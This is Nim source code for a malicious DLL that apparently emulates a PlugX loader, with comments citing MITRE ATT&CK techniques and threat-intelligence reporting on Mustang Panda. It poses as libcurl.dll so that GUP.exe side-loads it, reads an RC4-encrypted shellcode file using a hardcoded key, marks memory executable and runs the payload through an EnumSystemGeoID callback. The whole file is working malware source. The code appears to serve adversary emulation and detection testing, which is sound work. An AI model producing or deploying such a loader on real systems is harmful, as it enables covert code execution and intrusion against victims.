# Malicious DLL for Plug X

import winim/lean
import std/os
import std/osproc
import std/strformat
import RC4
import logger

# TODO rename or obfuscate
proc NimMain() {.cdecl, importc, exportc, dynlib.}

type
  Shellcode = seq[byte]
  Curl = pointer
  CURLcode = int

var SHELLCODE_FILENAME = "WinGUpdate.dat"
var SHELLCODE_KEY = "B8p4Eh1n4TDDux0b"
var CALLBACK_RESULT: DWORD = 0

#[
  Decrypt(shellcode: string)
    About:
      Returns decrypted shellcode using hardcoded RC4 key.
    Returns:
      Decrypted shellcode as a string.
    MITRE ATT&CK Techniques:
      T1027.013: Obfuscated Files or Information: Encrypted/Encoded File
]#
proc Decrypt(shellcode: string) : string {.cdecl.} =
  return fromRC4(SHELLCODE_KEY, shellcode.toHex())


#[
  LoadDat(fn: string)
    About:
      Reads in and decrypts the contents of the specified file.
    Returns:
      The decrypted data.
]#
proc LoadDat(fn: string) : Shellcode {.cdecl, exportc: "LoadDat", dynlib.} =
  LogDebug("Reading file data")
  var data = readFile(fn)

  LogDebug("Decrypting file data")
  var shellcode = Decrypt(data)
  return cast[seq[byte]](shellcode)


#[
  callback(geoid: GEOID)
    About:
      Callback function to pass into EnumSystemGeoID(). Loads malicious
      shellcode, decrypts it, loads it in memory, and executes it.
    Returns:
      Boolean.
    MITRE ATT&CK Techniques:
      T1620: Reflective Code Loading
]#
proc callback(geoid: GEOID) : BOOL {.stdcall.} =
  LogDebug("In callback")

  # Load shellcode from file
  var filename = SHELLCODE_FILENAME
  LogInfo(fmt"Loading data from {SHELLCODE_FILENAME}")
  let shellcode = LoadDat(filename)

  # Allocate memory
  LogDebug(fmt"Allocating {shellcode.len} bytes of memory")
  let rPtr = VirtualAlloc(
    nil,
    shellcode.len,
    MEM_COMMIT,
    PAGE_READWRITE
  )
  # Copy Shellcode to the allocated memory section
  copyMem(rPtr,shellcode[0].addr,shellcode.len)

  # Mark the memory as executable
  LogDebug("Adjusting memory")
  var dummy: DWORD
  VirtualProtect(rPtr,shellcode.len,PAGE_EXECUTE_READ,dummy.addr)

  # Cast pointer to procedure and call it
  LogInfo("Executing")
  let pCallback = cast[proc(): DWORD{.stdcall.}](rPtr)
  CALLBACK_RESULT = pCallback()

  return FALSE


#[
  curl_easy_init():
    About:
      Masquerading function from the legitimate libcurl.dll that GUP.exe calls.
      Uses EnumSystemGeoID() to execute a callback function to execute shellcode.
    Returns:
      Void.
    MITRE ATT&CK Techniques:
      T1574.002: Hijack Execution Flow: DLL Side-Loading
      T1106: Native API
    CTI:
      https://lab52.io/blog/mustang-pandas-plugx-new-variant-targetting-taiwanese-government-and-diplomats/
]#
proc curl_easy_init(): pointer {.cdecl, exportc: "curl_easy_init", dynlib.} =
  for param in os.commandLineParams():
    if param == "-i":
      if not InitializeLogger("C:\\Windows\\Temp\\WinGUpdateInstaller.log"):
        ExitProcess(11)

      LogInfo("Called directly from installer.")

      # Create new process so MSI installer can finish happily
      LogInfo("Creating new process.")

      try:
        let procResult = startProcess(os.getAppFilename())
        let procId = procResult.processID()
        LogInfo(&"Started process with ID {procId}.")
      except:
        LogError(&"Exception when creating new process: {getCurrentExceptionMsg()}")
      finally:
        CloseLogger()
        ExitProcess(0)

  # Callback execution if not called directly from MSI installer
  if not InitializeLogger("C:\\Windows\\Temp\\WinGUpdate.log"):
    ExitProcess(11)
  try:
    LogInfo("Performing geo callback")
    EnumSystemGeoID(
      16,
      0,
      cast[GEO_ENUMPROC](callback)
    )
    LogInfo(&"Finished geo callback. Result: {CALLBACK_RESULT}")
  except:
    LogError(&"Exception when performing callback: {getCurrentExceptionMsg()}")
    CALLBACK_RESULT = 2
  finally:
    LogInfo("Closing logger")
    CloseLogger()
    ExitProcess(CALLBACK_RESULT)

#[
  Other exports needed by GUP.exe; signatures may not be exactly correct but won't get called
]#
proc curl_easy_cleanup(handle: Curl) {.cdecl, exportc: "curl_easy_cleanup", dynlib.} =
  return

proc curl_easy_setopt(handle: Curl, option : int, parameter: int) : CURLcode {.cdecl, exportc: "curl_easy_setopt", dynlib.} =
  return 0

proc curl_easy_perform(handle: Curl) : CURLcode {.cdecl, exportc: "curl_easy_perform", dynlib.} =
  return 0


#[
  DllMain:
    About:
      Entry point into the library. Must start Nim's garbage collector.
    Returns:
      True.
]#
proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
  if fdwReason == DLL_PROCESS_ATTACH:
    NimMain() # You must manually import and start Nim's garbage collector if you define your own DllMain

  # Set this early on so gup.exe looks for gup.xml adjacently
  setCurrentDir(getAppDir())

  return True
